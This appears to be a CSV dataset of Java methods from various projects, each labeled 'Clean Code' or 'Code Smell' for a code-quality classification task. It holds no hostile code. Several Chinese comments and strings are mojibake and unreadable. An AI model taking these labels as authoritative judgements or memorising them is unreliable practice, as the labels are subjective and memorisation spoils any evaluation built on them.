text,label,text_label
"/** 
 * For rows that willing to participate entrance transition,  this function hide views if afterTransition is true,  show views if afterTransition is false.
 */
public void setEntranceTransitionState(boolean state){
}
/** 
 * For rows that willing to participate entrance transition,  this function hide views if afterTransition is true,  show views if afterTransition is false.
 */
public void setEntranceTransitionState(boolean state){
}
@Override public void setEntranceTransitionState(boolean state){
  getFragment().setEntranceTransitionState(state);
}
@Override public void setEntranceTransitionState(boolean state){
  getFragment().setEntranceTransitionState(state);
}
",0,Clean Code
"private void updateVideoPlayerTime(){
  Arrays.fill(videoPlayerCurrentTime,0);
  Arrays.fill(videoPlayerTotalTime,0);
  if (videoPlayer != null) {
    long current=Math.max(0,videoPlayer.getCurrentPosition());
    if (shownControlsByEnd && !actionBarWasShownBeforeByEnd) {
      current=0;
    }
    long total=Math.max(0,videoPlayer.getDuration());
    if (!inPreview && videoTimelineViewContainer.getVisibility() == View.VISIBLE) {
      total*=(videoTimelineView.getRightProgress() - videoTimelineView.getLeftProgress());
      current-=videoTimelineView.getLeftProgress() * total;
      if (current > total) {
        current=total;
      }
    }
    current/=1000;
    total/=1000;
    videoPlayerCurrentTime[0]=(int)(current / 60);
    videoPlayerCurrentTime[1]=(int)(current % 60);
    videoPlayerTotalTime[0]=(int)(total / 60);
    videoPlayerTotalTime[1]=(int)(total % 60);
  }
 else   if (photoViewerWebView != null && photoViewerWebView.isControllable()) {
    long current=Math.max(0,photoViewerWebView.getCurrentPosition());
    if (shownControlsByEnd && !actionBarWasShownBeforeByEnd) {
      current=0;
    }
    long total=Math.max(0,photoViewerWebView.getVideoDuration());
    if (!inPreview && videoTimelineViewContainer.getVisibility() == View.VISIBLE) {
      total*=(videoTimelineView.getRightProgress() - videoTimelineView.getLeftProgress());
      current-=videoTimelineView.getLeftProgress() * total;
      if (current > total) {
        current=total;
      }
    }
    current/=1000;
    total/=1000;
    videoPlayerCurrentTime[0]=(int)(current / 60);
    videoPlayerCurrentTime[1]=(int)(current % 60);
    videoPlayerTotalTime[0]=(int)(total / 60);
    videoPlayerTotalTime[1]=(int)(total % 60);
  }
  String current, total;
  if (videoPlayerCurrentTime[0] >= 60) {
    current=format(videoPlayerCurrentTime[0] / 60,videoPlayerCurrentTime[0] % 60,videoPlayerCurrentTime[1]);
  }
 else {
    current=format(videoPlayerCurrentTime[0],videoPlayerCurrentTime[1]);
  }
  if (videoPlayerTotalTime[0] >= 60) {
    total=format(videoPlayerTotalTime[0] / 60,videoPlayerTotalTime[0] % 60,videoPlayerTotalTime[1]);
  }
 else {
    total=format(videoPlayerTotalTime[0],videoPlayerTotalTime[1]);
  }
  videoPlayerTime.setText(current + "" / "" + total);
  if (!Objects.equals(lastControlFrameDuration,total)) {
    lastControlFrameDuration=total;
    videoPlayerControlFrameLayout.requestLayout();
  }
}",1,Code Smell
"@SuppressWarnings(""deprecation"") private void bindTags(GalleryTagGroup[] tagGroups){
  Context context=getEHContext();
  LayoutInflater inflater=getLayoutInflater2();
  Resources resources=getResources2();
  if (null == context || null == resources || null == mTags || null == mNoTags) {
    return;
  }
  mTags.removeViews(1,mTags.getChildCount() - 1);
  if (tagGroups == null || tagGroups.length == 0) {
    mNoTags.setVisibility(View.VISIBLE);
    return;
  }
 else {
    mNoTags.setVisibility(View.GONE);
  }
  EhTagDatabase ehTags=Settings.getShowTagTranslations() ? EhTagDatabase.getInstance(context) : null;
  int colorTag=AttrResources.getAttrColor(context,R.attr.tagBackgroundColor);
  int colorName=AttrResources.getAttrColor(context,R.attr.tagGroupBackgroundColor);
  for (  GalleryTagGroup tg : tagGroups) {
    LinearLayout ll=(LinearLayout)inflater.inflate(R.layout.gallery_tag_group,mTags,false);
    ll.setOrientation(LinearLayout.HORIZONTAL);
    mTags.addView(ll);
    String readableTagName=null;
    if (ehTags != null) {
      readableTagName=ehTags.getTranslation(""n:"" + tg.groupName);
    }
    TextView tgName=(TextView)inflater.inflate(R.layout.item_gallery_tag,ll,false);
    ll.addView(tgName);
    tgName.setText(readableTagName != null ? readableTagName : tg.groupName);
    tgName.setBackgroundDrawable(new RoundSideRectDrawable(colorName));
    String prefix=EhTagDatabase.namespaceToPrefix(tg.groupName);
    if (prefix == null) {
      prefix="""";
    }
    AutoWrapLayout awl=new AutoWrapLayout(context);
    ll.addView(awl,ViewGroup.LayoutParams.WRAP_CONTENT,ViewGroup.LayoutParams.WRAP_CONTENT);
    for (int j=0, z=tg.size(); j < z; j++) {
      TextView tag=(TextView)inflater.inflate(R.layout.item_gallery_tag,awl,false);
      awl.addView(tag);
      String tagStr=tg.getTagAt(j);
      String readableTag=null;
      if (ehTags != null) {
        readableTag=ehTags.getTranslation(prefix + tagStr);
      }
      tag.setText(readableTag != null ? readableTag : tagStr);
      tag.setBackgroundDrawable(new RoundSideRectDrawable(colorTag));
      tag.setTag(R.id.tag,tg.groupName + "":"" + tagStr);
      tag.setOnClickListener(this);
      tag.setOnLongClickListener(this);
    }
  }
}",1,Code Smell
"private void requestLinkPreview(TLRPC.TL_messages_getWebPagePreview req,Utilities.Callback2<Boolean,TLRPC.WebPage> done){
  cancelSearchLinks();
  linkSearchRequestId=getConnectionsManager().sendRequest(req,(response,error) -> AndroidUtilities.runOnUIThread(() -> {
    linkSearchRequestId=0;
    if (response instanceof TLRPC.TL_messageMediaWebPage) {
      TLRPC.TL_messageMediaWebPage media=(TLRPC.TL_messageMediaWebPage)response;
      if (media.webpage != null && ""telegram_story"".equals(media.webpage.type)) {
        TLRPC.TL_webPageAttributeStory _attrStory=null;
        if (media.webpage.attributes != null) {
          for (int i=0; i < media.webpage.attributes.size(); ++i) {
            if (media.webpage.attributes.get(i) instanceof TLRPC.TL_webPageAttributeStory) {
              _attrStory=(TLRPC.TL_webPageAttributeStory)media.webpage.attributes.get(i);
              break;
            }
          }
        }
        if (_attrStory == null) {
          done.run(false,null);
          return;
        }
        if (_attrStory != null && _attrStory.storyItem != null) {
          done.run(true,media.webpage);
          return;
        }
        final TLRPC.TL_webPageAttributeStory attrStory=_attrStory;
        getMessagesStorage().getStorageQueue().postRunnable(() -> {
          try {
            LongSparseArray<ArrayList<MessageObject>> array=new LongSparseArray<>();
            TLRPC.TL_message message=new TLRPC.TL_message();
            message.message="""";
            message.id=0;
            message.media=media;
            ArrayList<MessageObject> list=new ArrayList<>();
            list.add(new MessageObject(currentAccount,message,false,false));
            array.put(DialogObject.getPeerDialogId(attrStory.peer),list);
            getMessagesController().getStoriesController().getStoriesStorage().fillMessagesWithStories(array,() -> {
              MessageObject result=null;
              if (array.size() == 1 && array.valueAt(0) != null && array.valueAt(0).size() == 1) {
                result=array.valueAt(0).get(0);
              }
              if (result != null && result.messageOwner != null && result.messageOwner.media != null && result.messageOwner.media.webpage != null && result.messageOwner.media.webpage.attributes != null) {
                for (int i=0; i < result.messageOwner.media.webpage.attributes.size(); ++i) {
                  TLRPC.WebPageAttribute attr=result.messageOwner.media.webpage.attributes.get(i);
                  if (attr instanceof TLRPC.TL_webPageAttributeStory) {
                    if (((TLRPC.TL_webPageAttributeStory)attr).storyItem != null) {
                      final TLRPC.WebPage webpage=result.messageOwner.media.webpage;
                      AndroidUtilities.runOnUIThread(() -> {
                        done.run(true,webpage);
                      }
);
                      return;
                    }
                  }
                }
              }
              AndroidUtilities.runOnUIThread(() -> {
                done.run(false,null);
              }
);
            }
,classGuid,false);
          }
 catch (          Exception ignore) {
          }
        }
);
      }
 else {
        done.run(media.webpage != null,media.webpage);
      }
    }
 else {
      done.run(false,null);
    }
  }
));
  getConnectionsManager().bindRequestToGuid(linkSearchRequestId,classGuid);
}",1,Code Smell
"@Override public void onProcessMessage(V2TIMMessage v2TIMMessage){
  String data=new String(v2TIMMessage.getCustomElem().getData());
  if (!TextUtils.isEmpty(data)) {
    invisibleBean=new InvisibleBean();
    try {
      JSONObject invisibleJson=new JSONObject(data);
      invisibleBean.src=invisibleJson.optString(TUIConstants.TUICustomerServicePlugin.CUSTOMER_SERVICE_BUSINESS_ID_SRC_KEY);
      JSONObject contentJson=invisibleJson.optJSONObject(TUICustomerServiceConstants.CUSTOMER_SERVICE_ITEM_CONTENT);
      if (contentJson != null) {
        invisibleBean.menuSendRuleFlag=contentJson.optInt(InvisibleBean.MENU_SEND_RULE_FLAG);
      }
    }
 catch (    JSONException e) {
      TUIChatLog.e(""InvisibleMessageBean"",""exception e = "" + e);
    }
  }
  if (invisibleBean != null) {
    if (invisibleBean.src.equals(TUIConstants.TUICustomerServicePlugin.BUSINESS_ID_SRC_CUSTOMER_SERVICE_EVALUATION_SELECTED)) {
      setExtra(TUIChatService.getAppContext().getString(R.string.satisfaction_evaluation));
    }
 else     if (invisibleBean.src.equals(TUIConstants.TUICustomerServicePlugin.BUSINESS_ID_SRC_CUSTOMER_SERVICE_END)) {
      setExtra(TUIChatService.getAppContext().getString(R.string.session_end));
    }
 else     if (invisibleBean.src.equals(TUIConstants.TUICustomerServicePlugin.BUSINESS_ID_SRC_CUSTOMER_SERVICE_TIMEOUT)) {
      setExtra(TUIChatService.getAppContext().getString(R.string.session_timeout));
    }
 else     if (invisibleBean.src.equals(TUIConstants.TUICustomerServicePlugin.BUSINESS_ID_SRC_CUSTOMER_SERVICE_EVALUATION_SETTING)) {
      int triggerResult=invisibleBean.menuSendRuleFlag & invisibleBean.RULE_USER_TRIGGER_EVALUATION;
      TUICustomerServicePluginService.getInstance().setCanTriggerEvaluation(triggerResult > 0 ? true : false);
    }
 else     if (invisibleBean.src.equals(TUIConstants.TUICustomerServicePlugin.BUSINESS_ID_SRC_CUSTOMER_SERVICE_TRIGGER_EVALUATION)) {
    }
 else     if (invisibleBean.src.equals(TUIConstants.TUICustomerServicePlugin.BUSINESS_ID_SRC_CUSTOMER_SERVICE_SAY_HELLO)) {
    }
 else {
      String text=TUICustomerServicePluginService.getAppContext().getString(com.tencent.qcloud.tuikit.timcommon.R.string.timcommon_no_support_msg);
      setExtra(text);
    }
  }
 else {
    String text=TUICustomerServicePluginService.getAppContext().getString(com.tencent.qcloud.tuikit.timcommon.R.string.timcommon_no_support_msg);
    setExtra(text);
  }
}",0,Clean Code
"@Override public boolean equals(Object obj){
  if (this == obj)   return true;
  if (obj == null)   return false;
  if (getClass() != obj.getClass())   return false;
  DriverIdentity other=(DriverIdentity)obj;
  if (driverClassName == null) {
    if (other.driverClassName != null)     return false;
  }
 else   if (!driverClassName.equals(other.driverClassName))   return false;
  if (majorVersion != other.majorVersion)   return false;
  if (minorVersion != other.minorVersion)   return false;
  return true;
}
",0,Clean Code
"/** 
 * 鍒犻櫎鏂囦欢澶逛互鍙婄洰褰曚笅鐨勬枃浠�
 * @param filePath 琚垹闄ょ洰褰曠殑鏂囦欢璺緞
 * @return 鐩綍鍒犻櫎鎴愬姛杩斿洖true锛屽惁鍒欒繑鍥瀎alse
 */
public static boolean deleteDirectory(String filePath){
  boolean flag;
  if (filePath == null || filePath.length() == 0)   return false;
  if (!filePath.endsWith(File.separator)) {
    filePath=filePath + File.separator;
  }
  File dirFile=new File(filePath);
  try {
    if (!dirFile.exists() || !dirFile.isDirectory()) {
      return false;
    }
    flag=true;
    File[] files=dirFile.listFiles();
    for (    File file : files) {
      if (file.isFile()) {
        flag=deleteFile(file.getAbsolutePath());
      }
 else {
        flag=deleteDirectory(file.getAbsolutePath());
      }
      if (!flag)       break;
    }
    if (!flag)     return false;
  }
 catch (  Exception e) {
    return false;
  }
  return dirFile.delete();
}",0,Clean Code
"Expression resolveCallExpressionInternal(Type targetType,String name,List<? extends ExpressionElement> inner,boolean implicit){
  int innerLength=inner.size();
  Expression result=null;
  TypedFunction resultFunction=null;
  functions:   for (  TypedFunction f : this.functionResolver.resolve(name,targetType)) {
    Parameter[] paramTypes=f.getParameters();
    if (paramTypes.length != innerLength)     continue;
    Expression[] params=new Expression[innerLength];
    for (int i=0; i < innerLength; i++) {
      ExpressionElement paramExpression=inner.get(i);
      Parameter param=paramTypes[i];
      if (param.constant() && !(paramExpression instanceof NumberToken)) {
        continue functions;
      }
      Expression expression=this.resolveExpressionInternal(param.type(),paramExpression,!implicit || innerLength > 1,implicit);
      if (expression == null)       continue functions;
      params[i]=expression;
    }
    if (result != null && f.priority() == resultFunction.priority()) {
      throw new RuntimeException(""Ambiguity, \n\told: "" + TypedFunction.format(resultFunction,"""") + ""\n\tnew: ""+ TypedFunction.format(f,""""));
    }
 else     if (resultFunction == null || f.priority() >= resultFunction.priority()) {
      result=new CallExpression(f,params);
      resultFunction=f;
    }
  }
  return result;
}",1,Code Smell
"/** 
 * 鐘舵��
 * @return 鎴愬姛
 */
public static SysResult ok(){
  return new SysResult(200,""ok"",null);
}
/** 
 * 鐘舵��
 * @param data vo瑕佸皝瑁呯殑鏁版嵁
 * @return vo
 */
public static SysResult ok(Object data){
  return new SysResult(200,""ok"",data);
}",0,Clean Code
"@Override public CfLogisticsStorehousePlatformCargoTypeExample getExampleByQuery(CfLogisticsStorehousePlatformCargoTypeQuery cfLogisticsStorehousePlatformCargoTypeQuery){
  CfLogisticsStorehousePlatformCargoTypeExample cfLogisticsStorehousePlatformCargoTypeExample=new CfLogisticsStorehousePlatformCargoTypeExample();
  CfLogisticsStorehousePlatformCargoTypeExample.Criteria criteria=cfLogisticsStorehousePlatformCargoTypeExample.createCriteria();
  if (cfLogisticsStorehousePlatformCargoTypeQuery.getLogisticsStorehouseId() != null) {
    criteria.andLogisticsStorehouseIdEqualTo(cfLogisticsStorehousePlatformCargoTypeQuery.getLogisticsStorehouseId());
  }
  if (cfLogisticsStorehousePlatformCargoTypeQuery.getLogisticsStorehousePlatformId() != null) {
    criteria.andLogisticsStorehousePlatformIdEqualTo(cfLogisticsStorehousePlatformCargoTypeQuery.getLogisticsStorehousePlatformId());
  }
  if (cfLogisticsStorehousePlatformCargoTypeQuery.getLogisticsStorehousePlatformIds() != null && cfLogisticsStorehousePlatformCargoTypeQuery.getLogisticsStorehousePlatformIds().size() > 0) {
    criteria.andLogisticsStorehousePlatformIdIn(cfLogisticsStorehousePlatformCargoTypeQuery.getLogisticsStorehousePlatformIds());
  }
  if (cfLogisticsStorehousePlatformCargoTypeQuery.getFactoryId() != null) {
    criteria.andFactoryIdEqualTo(cfLogisticsStorehousePlatformCargoTypeQuery.getFactoryId());
  }
  if (cfLogisticsStorehousePlatformCargoTypeQuery.getCargoType() != null) {
    criteria.andCargoTypeEqualTo(cfLogisticsStorehousePlatformCargoTypeQuery.getCargoType());
  }
  if (StringUtils.isNotEmpty(cfLogisticsStorehousePlatformCargoTypeQuery.getOrderBy())) {
    cfLogisticsStorehousePlatformCargoTypeExample.setOrderByClause(cfLogisticsStorehousePlatformCargoTypeQuery.getOrderBy());
  }
  if (cfLogisticsStorehousePlatformCargoTypeQuery.getPage() != null && cfLogisticsStorehousePlatformCargoTypeQuery.getSize() != null) {
    PageHelper.startPage(cfLogisticsStorehousePlatformCargoTypeQuery.getPage(),cfLogisticsStorehousePlatformCargoTypeQuery.getSize());
  }
  return cfLogisticsStorehousePlatformCargoTypeExample;
}",0,Clean Code
"public NodePorts(final Node n,final Graph2D graph){
  final double width=graph.getWidth(n);
  final double halfWidth=width * 0.5;
  final double partWidth=graph.getWidth(n) / 3.0;
  final double halfHeight=graph.getHeight(n) * 0.5;
  double stepWidth=partWidth / (n.inDegree() + 1);
  double xOffset=0;
  for (int i=0; i < n.inDegree(); i++) {
    xOffset+=stepWidth;
    final PortCandidate pc=PortCandidate.createCandidate(xOffset - halfWidth,-halfHeight,PortCandidate.NORTH);
    topLeftPorts.add(pc);
    candidateSet.add(pc,1);
  }
  xOffset+=stepWidth;
  for (int i=0; i < n.inDegree(); i++) {
    xOffset+=stepWidth;
    final PortCandidate pc=PortCandidate.createCandidate(xOffset - halfWidth,-halfHeight,PortCandidate.NORTH);
    topMiddlePorts.add(pc);
    candidateSet.add(pc,1);
  }
  xOffset+=stepWidth;
  for (int i=0; i < n.inDegree(); i++) {
    xOffset+=stepWidth;
    final PortCandidate pc=PortCandidate.createCandidate(xOffset - halfWidth,-halfHeight,PortCandidate.NORTH);
    topRightPorts.add(pc);
    candidateSet.add(pc,1);
  }
  stepWidth=partWidth / (n.outDegree() + 1);
  xOffset=0;
  for (int i=0; i < n.outDegree(); i++) {
    xOffset+=stepWidth;
    final PortCandidate pc=PortCandidate.createCandidate(xOffset - halfWidth,halfHeight,PortCandidate.SOUTH);
    bottomLeftPorts.add(pc);
    candidateSet.add(pc,1);
  }
  xOffset+=stepWidth;
  for (int i=0; i < n.outDegree(); i++) {
    xOffset+=stepWidth;
    final PortCandidate pc=PortCandidate.createCandidate(xOffset - halfWidth,halfHeight,PortCandidate.SOUTH);
    bottomMiddlePorts.add(pc);
    candidateSet.add(pc,1);
  }
  xOffset+=stepWidth;
  for (int i=0; i < n.outDegree(); i++) {
    xOffset+=stepWidth;
    final PortCandidate pc=PortCandidate.createCandidate(xOffset - halfWidth,halfHeight,PortCandidate.SOUTH);
    bottomRightPorts.add(pc);
    candidateSet.add(pc,1);
  }
}",0,Clean Code
"@Test public void testArrayBinarySearchFloor(){
  long[] values=new long[0];
  assertThat(binarySearchFloor(values,0,false,false)).isEqualTo(-1);
  assertThat(binarySearchFloor(values,0,false,true)).isEqualTo(0);
  values=new long[]{1,3,5};
  assertThat(binarySearchFloor(values,0,false,false)).isEqualTo(-1);
  assertThat(binarySearchFloor(values,0,true,false)).isEqualTo(-1);
  assertThat(binarySearchFloor(values,0,false,true)).isEqualTo(0);
  assertThat(binarySearchFloor(values,0,true,true)).isEqualTo(0);
  assertThat(binarySearchFloor(values,1,false,false)).isEqualTo(-1);
  assertThat(binarySearchFloor(values,1,true,false)).isEqualTo(0);
  assertThat(binarySearchFloor(values,1,false,true)).isEqualTo(0);
  assertThat(binarySearchFloor(values,1,true,true)).isEqualTo(0);
  assertThat(binarySearchFloor(values,4,false,false)).isEqualTo(1);
  assertThat(binarySearchFloor(values,4,true,false)).isEqualTo(1);
  assertThat(binarySearchFloor(values,5,false,false)).isEqualTo(1);
  assertThat(binarySearchFloor(values,5,true,false)).isEqualTo(2);
  assertThat(binarySearchFloor(values,6,false,false)).isEqualTo(2);
  assertThat(binarySearchFloor(values,6,true,false)).isEqualTo(2);
}",0,Clean Code
"void showAddQuickSearchDialog(final List<QuickSearch> list,final ArrayAdapter<QuickSearch> adapter,final ListView listView,final TextView tip){
  Context context=getEHContext();
  final ListUrlBuilder urlBuilder=mUrlBuilder;
  if (null == context || null == urlBuilder) {
    return;
  }
  if (ListUrlBuilder.MODE_IMAGE_SEARCH == urlBuilder.getMode()) {
    showTip(R.string.image_search_not_quick_search,LENGTH_LONG);
    return;
  }
  for (  QuickSearch q : list) {
    if (urlBuilder.equalsQuickSearch(q)) {
      showTip(getString(R.string.duplicate_quick_search,q.name),LENGTH_LONG);
      return;
    }
  }
  final EditTextDialogBuilder builder=new EditTextDialogBuilder(context,getSuitableTitleForUrlBuilder(context.getResources(),urlBuilder,false),getString(R.string.quick_search));
  builder.setTitle(R.string.add_quick_search_dialog_title);
  builder.setPositiveButton(android.R.string.ok,null);
  final AlertDialog dialog=builder.show();
  dialog.getButton(DialogInterface.BUTTON_POSITIVE).setOnClickListener(v -> {
    String text=builder.getText().trim();
    if (TextUtils.isEmpty(text)) {
      builder.setError(getString(R.string.name_is_empty));
      return;
    }
    for (    QuickSearch q : list) {
      if (text.equals(q.name)) {
        builder.setError(getString(R.string.duplicate_name));
        return;
      }
    }
    builder.setError(null);
    dialog.dismiss();
    QuickSearch quickSearch=urlBuilder.toQuickSearch();
    if (Settings.getShowTagTranslations()) {
      if (ehTags == null) {
        ehTags=EhTagDatabase.getInstance(context);
      }
      String[] parts=text.split(""(?=(?:(?:[^\""]*\""){2})*[^\""]*$)\\s+"");
      String newText="""";
      for (int i=0; i < parts.length; i++) {
        String[] tags=parts[i].split("":"");
        for (int j=0; j < tags.length; j++) {
          tags[j]=tags[j].replace(""\"""","""").replace(""$"","""");
        }
        quickSearch.name=TagTranslationUtil.getTagCN(tags,ehTags);
        if (newText.isEmpty()) {
          newText=TagTranslationUtil.getTagCN(tags,ehTags);
        }
 else {
          newText+="" "" + TagTranslationUtil.getTagCN(tags,ehTags);
        }
      }
      quickSearch.name=newText;
    }
 else {
      quickSearch.name=text;
    }
    EhDB.insertQuickSearch(quickSearch);
    list.add(quickSearch);
    adapter.notifyDataSetChanged();
    if (0 == list.size()) {
      tip.setVisibility(View.VISIBLE);
      listView.setVisibility(View.GONE);
    }
 else {
      tip.setVisibility(View.GONE);
      listView.setVisibility(View.VISIBLE);
    }
  }
);
}",1,Code Smell
"public Optional<String> evaluateAndUploadLargePayload(Map<String,Object> taskOutputData,String taskType){
  try (ByteArrayOutputStream byteArrayOutputStream=new ByteArrayOutputStream()){
    objectMapper.writeValue(byteArrayOutputStream,taskOutputData);
    byte[] taskOutputBytes=byteArrayOutputStream.toByteArray();
    long taskResultSize=taskOutputBytes.length;
    MetricsContainer.recordTaskResultPayloadSize(taskType,taskResultSize);
    long payloadSizeThreshold=conductorClientConfiguration.getTaskOutputPayloadThresholdKB() * 1024L;
    if (taskResultSize > payloadSizeThreshold) {
      if (!conductorClientConfiguration.isExternalPayloadStorageEnabled() || taskResultSize > conductorClientConfiguration.getTaskOutputMaxPayloadThresholdKB() * 1024L) {
        throw new IllegalArgumentException(String.format(""The TaskResult payload size: %d is greater than the permissible %d bytes"",taskResultSize,payloadSizeThreshold));
      }
      MetricsContainer.incrementExternalPayloadUsedCount(taskType,ExternalPayloadStorage.Operation.WRITE.name(),ExternalPayloadStorage.PayloadType.TASK_OUTPUT.name());
      return Optional.of(uploadToExternalPayloadStorage(PayloadType.TASK_OUTPUT,taskOutputBytes,taskResultSize));
    }
    return Optional.empty();
  }
 catch (  IOException e) {
    String errorMsg=String.format(""Unable to update task: %s with task result"",taskType);
    LOGGER.error(errorMsg,e);
    throw new ConductorClientException(errorMsg,e);
  }
}",0,Clean Code
"@Override @Transactional public String checkOut(Long[] ids){
  List<NewBeeMallOrder> orders=newBeeMallOrderMapper.selectByPrimaryKeys(Arrays.asList(ids));
  String errorOrderNos="""";
  if (!CollectionUtils.isEmpty(orders)) {
    for (    NewBeeMallOrder newBeeMallOrder : orders) {
      if (newBeeMallOrder.getIsDeleted() == 1) {
        errorOrderNos+=newBeeMallOrder.getOrderNo() + "" "";
        continue;
      }
      if (newBeeMallOrder.getOrderStatus() != 1 && newBeeMallOrder.getOrderStatus() != 2) {
        errorOrderNos+=newBeeMallOrder.getOrderNo() + "" "";
      }
    }
    if (!StringUtils.hasText(errorOrderNos)) {
      if (newBeeMallOrderMapper.checkOut(Arrays.asList(ids)) > 0) {
        return ServiceResultEnum.SUCCESS.getResult();
      }
 else {
        return ServiceResultEnum.DB_ERROR.getResult();
      }
    }
 else {
      if (errorOrderNos.length() > 0 && errorOrderNos.length() < 100) {
        return errorOrderNos + ""璁㈠崟鐨勭姸鎬佷笉鏄敮浠樻垚鍔熸垨閰嶈揣瀹屾垚鏃犳硶鎵ц鍑哄簱鎿嶄綔"";
      }
 else {
        return ""浣犻�夋嫨浜嗗お澶氱姸鎬佷笉鏄敮浠樻垚鍔熸垨閰嶈揣瀹屾垚鐨勮鍗曪紝鏃犳硶鎵ц鍑哄簱鎿嶄綔"";
      }
    }
  }
  return ServiceResultEnum.DATA_NOT_EXIST.getResult();
}",1,Code Smell
"/** 
 * Returns the most restrictive type that is assignable from all given types.
 */
static Type gcd(Type... types){
  if (types.length == 0) {
    return Object.class;
  }
  Type best=types[0];
  Primitive bestPrimitive=Primitive.of(best);
  if (bestPrimitive != null) {
    for (int i=1; i < types.length; i++) {
      final Primitive primitive=Primitive.of(types[i]);
      if (primitive == null) {
        return Object.class;
      }
      if (primitive.assignableFrom(bestPrimitive)) {
        bestPrimitive=primitive;
      }
 else       if (bestPrimitive.assignableFrom(primitive)) {
      }
 else       if (bestPrimitive == Primitive.CHAR || bestPrimitive == Primitive.BYTE) {
        bestPrimitive=Primitive.INT;
        --i;
      }
 else {
        return Object.class;
      }
    }
    return bestPrimitive.primitiveClass;
  }
 else {
    for (int i=1; i < types.length; i++) {
      if (types[i] != types[0]) {
        return Object.class;
      }
    }
  }
  return types[0];
}",1,Code Smell
"@java.lang.Override public boolean equals(final java.lang.Object obj){
  if (obj == this) {
    return true;
  }
  if (!(obj instanceof org.tribuo.interop.onnx.protos.ExampleTransformerProto)) {
    return super.equals(obj);
  }
  org.tribuo.interop.onnx.protos.ExampleTransformerProto other=(org.tribuo.interop.onnx.protos.ExampleTransformerProto)obj;
  if (getVersion() != other.getVersion())   return false;
  if (!getClassName().equals(other.getClassName()))   return false;
  if (hasSerializedData() != other.hasSerializedData())   return false;
  if (hasSerializedData()) {
    if (!getSerializedData().equals(other.getSerializedData()))     return false;
  }
  if (!unknownFields.equals(other.unknownFields))   return false;
  return true;
}
",0,Clean Code
"public static void handleReadDocument(Activity activity,@Nullable Uri data) throws IOException, JSONException {
  if (data == null)   return;
  SharedPreferences.Editor edit=PrefsUtils.mSharedPreferences.edit();
  InputStream inputStream=activity.getContentResolver().openInputStream(data);
  BufferedReader bufferedReader=new BufferedReader(new InputStreamReader(inputStream));
  StringBuilder stringBuilder=new StringBuilder();
  String line=bufferedReader.readLine();
  while (line != null) {
    stringBuilder.append(line);
    line=bufferedReader.readLine();
  }
  String read=stringBuilder.toString();
  JSONObject jsonObject=new JSONObject(read);
  Iterator<String> keys=jsonObject.keys();
  while (keys.hasNext()) {
    String key=keys.next();
    Object value=jsonObject.get(key);
    if (value instanceof String) {
      if (((String)value).contains(""["") && ((String)value).contains(""]"")) {
        value=((String)value).replace(""["","""").replace(""]"","""").replace("" "","""");
        String[] array=((String)value).split("","");
        List<String> list=Arrays.asList(array);
        Set<String> stringSet=new HashSet<>(list);
        edit.putStringSet(key,stringSet);
      }
 else {
        edit.putString(key,(String)value);
      }
    }
 else     if (value instanceof Boolean) {
      edit.putBoolean(key,(Boolean)value);
    }
 else     if (value instanceof Integer) {
      edit.putInt(key,(Integer)value);
    }
  }
  bufferedReader.close();
  edit.apply();
}
",1,Code Smell
